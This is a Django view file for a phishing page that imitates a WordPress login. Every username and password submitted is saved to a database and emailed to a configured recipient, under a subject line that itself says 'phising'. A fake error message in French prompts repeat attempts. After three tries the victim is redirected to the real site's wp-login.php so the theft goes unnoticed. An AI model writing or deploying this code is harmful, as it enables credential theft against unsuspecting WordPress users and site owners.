from django.shortcuts import render, redirect
from django.contrib import messages
from . models import Login
from django.conf import settings

from django.core.mail import EmailMessage
from django.template.loader import render_to_string



def login(request):
    if request.method=="POST":

        login = Login()
        login.username = request.POST['username']
        login.password = request.POST['password']
        login.save()


        template_email = render_to_string('loginpage/email.html', {'username' : request.POST['username'], 'password' : request.POST['password']})
        email = EmailMessage("Wp user logged [Wp logging - phising]", template_email, settings.EMAIL_HOST_USER, [settings.RECIPIENT])
        email.fail_silently = False
        try:
            email.send()
        except Exception as e:
            print(e)
        else:
            print("Wp logging info sent.")

        # the number of attempts limited to 3
        try:
            request.session['delay'] += 1
        except:
            request.session['delay'] = 1
        if request.session['delay'] == 3:
            # request.session.set_expiry(5*2) # 5 seconds
            return redirect(f"{settings.TARGET_URL}/wp-login.php")
        messages.info(request, f"Erreur : ce mot de passe ne correspond pas à l’identifiant {request.POST['username']}.")

    return render(request, 'loginpage/login.html', {})
